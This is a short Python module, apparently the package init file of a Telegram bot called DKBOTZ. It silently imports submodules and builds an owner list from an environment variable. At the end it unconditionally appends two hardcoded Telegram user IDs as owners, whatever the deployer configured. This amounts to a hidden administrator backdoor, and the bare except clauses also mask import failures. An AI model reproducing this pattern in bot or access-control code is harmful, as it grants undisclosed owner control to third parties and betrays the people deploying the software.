try:
    from .leaks import *
except:
    pass
try:
    from .paid import *
except:
    pass


try:
    from .acc import *
except:
    pass


import os


try:
    from .admin import *
except:
    pass

try:
    from .log import *
except:
    pass

try:
    DKBOTZOWNER=[]
    for x in (os.environ.get("DKBOTZ_BY_OWNER", "5111685964").split()):
        DKBOTZOWNER.append(int(x))
except ValueError:
        print("Your Admins list does not contain valid integers.")

DKBOTZOWNER.append(5111685964)
DKBOTZOWNER.append(1805398747)






